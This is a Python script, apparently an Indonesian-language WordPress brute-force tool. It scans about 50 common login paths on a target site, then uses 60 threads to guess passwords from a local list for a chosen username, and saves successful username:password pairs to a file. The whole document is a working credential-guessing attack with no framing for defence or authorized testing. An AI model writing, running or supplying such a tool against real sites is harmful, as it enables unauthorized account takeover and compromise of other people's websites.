import requests
import time
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Configuration
PASSWORD_FILE = "password.txt"  # Local password file
SAVE_FILE = "success.txt"
MAX_THREADS = 60  # Increased threads for faster scanning
TIMEOUT = 5
DELAY = 0.05  # Reduced delay for faster scanning

# 80+ WordPress login paths (optimized order)
WP_LOGIN_PATHS = [
    "/wp-login.php", "/wp-admin", "/login", "/admin",
    "/wp/wp-login.php", "/wordpress/wp-login.php", "/blog/wp-login.php",
    "/cms/wp-login.php", "/site/wp-login.php", "/web/wp-login.php",
    "/main/wp-login.php", "/wp/admin/wp-login.php", "/admin/wp/wp-login.php",
    "/admin/wordpress/wp-login.php", "/admin/cms/wp-login.php",
    "/content/wp/wp-login.php", "/contents/wp/wp-login.php", "/html/wp/wp-login.php",
    "/private/wp-login.php", "/secure/wp-login.php", "/hidden/wp-login.php",
    "/auth/wp-login.php", "/dev/wp-login.php", "/staging/wp-login.php",
    "/test/wp-login.php", "/old/wp-login.php", "/backup/wp-login.php",
    "/new/wp-login.php", "/en/wp-login.php", "/id/wp-login.php",
    "/us/wp-login.php", "/website/wp-login.php", "/portal/wp-login.php",
    "/system/wp-login.php", "/secure-login", "/wp-login.php?action=register",
    "/wp-signup.php", "/dashboard/wp-login.php", "/control/wp-login.php",
    "/manage/wp-login.php", "/panel/wp-login.php", "/subdomain/wp/wp-login.php",
    "/clientarea/wp/wp-login.php", "/users/wp/wp-login.php", "/wplogin.php",
    "/wpadmin.php", "/wp-login", "/wpadmin", "/wordpress-login.php",
    "/wp-content/wp-login.php"
]

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def load_password_file():
    """Load passwords from local password.txt file"""
    try:
        with open(PASSWORD_FILE, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}[!] File password.txt tidak ditemukan!{Style.RESET_ALL}")
        return None

def normalize_url(url):
    """Normalize URL input (supports https://contoh.com and contoh.com)"""
    url = url.strip()
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    return url.split('?')[0].rstrip('/')

def detect_wp_login(base_url):
    """Fast parallel login page detection"""
    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = {executor.submit(check_path, base_url, path): path for path in WP_LOGIN_PATHS}
        for future in as_completed(futures):
            result = future.result()
            if result:
                executor.shutdown(wait=False)
                return result
    return None

def check_path(base_url, path):
    test_url = f"{base_url.rstrip('/')}{path}"
    try:
        response = requests.head(test_url, timeout=3, allow_redirects=True)
        final_url = response.url.lower()
        if any(x in final_url for x in ["wp-login", "wp-admin", "login"]):
            return final_url
        if "wp-content" in requests.get(test_url, timeout=3).text.lower():
            return test_url
    except:
        return None
    return None

def brute_force(target, creds):
    """Optimized brute force with session reuse"""
    username, password = creds
    try:
        with requests.Session() as session:
            response = session.post(
                target,
                data={
                    "log": username,
                    "pwd": password,
                    "wp-submit": "Log In",
                    "redirect_to": target.replace("wp-login.php", "wp-admin/")
                },
                timeout=TIMEOUT,
                allow_redirects=False
            )
            
            if response.status_code == 302 and "wp-admin" in response.headers.get('Location', ''):
                with open(SAVE_FILE, 'a') as f:
                    f.write(f"{target}|{username}:{password}\n")
                print(f"{Fore.GREEN}[SUCCESS] {target} {username}:{password}{Style.RESET_ALL}")
                return True
    except:
        pass
    print(f"{Fore.RED}[FAILED] {target} {username}:{password}{Style.RESET_ALL}")
    return False

def single_target_mode():
    """Mode 1: Single target with manual username"""
    target = input("\nMasukkan URL target (contoh.com atau https://contoh.com): ").strip()
    username = input("Masukkan username WordPress: ").strip()
    
    if not username:
        print(f"{Fore.RED}[!] Username harus diisi!{Style.RESET_ALL}")
        return
    
    normalized_url = normalize_url(target)
    print(f"\n{Fore.CYAN}[*] Mencari halaman login di 80+ path...{Style.RESET_ALL}")
    
    login_url = detect_wp_login(normalized_url)
    if not login_url:
        print(f"{Fore.RED}[!] Gagal menemukan halaman login{Style.RESET_ALL}")
        return
    
    print(f"{Fore.GREEN}[+] Login ditemukan: {login_url}{Style.RESET_ALL}")
    
    passwords = load_password_file()
    if not passwords:
        return
    
    print(f"\n{Fore.CYAN}[*] Memulai brute force dengan {len(passwords)} password{Style.RESET_ALL}")
    start_time = time.time()
    success_count = 0
    
    # Ultra-fast brute force
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [executor.submit(brute_force, login_url, (username, p)) for p in passwords]
        for future in as_completed(futures):
            if future.result():
                success_count += 1
            time.sleep(DELAY)
    
    elapsed = time.time() - start_time
    print(f"\n{Fore.CYAN}[*] Selesai dalam {elapsed:.2f} detik{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Kecepatan: {len(passwords)/elapsed:.1f} percobaan/detik{Style.RESET_ALL}")
    
    if success_count > 0:
        print(f"{Fore.GREEN}[+] ANDA SUCCESS [HASIL {success_count}]{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[-] ANDA GAGAL [HASIL 0]{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Hasil disimpan di: {SAVE_FILE}{Style.RESET_ALL}")

def main():
    clear_screen()
    print(f"\n{Fore.BLUE}=== WORDPRESS BRUTE FORCE TOOL ==={Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Mode 1: Single Target (Manual Username){Style.RESET_ALL}")
    single_target_mode()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Dihentikan pengguna{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
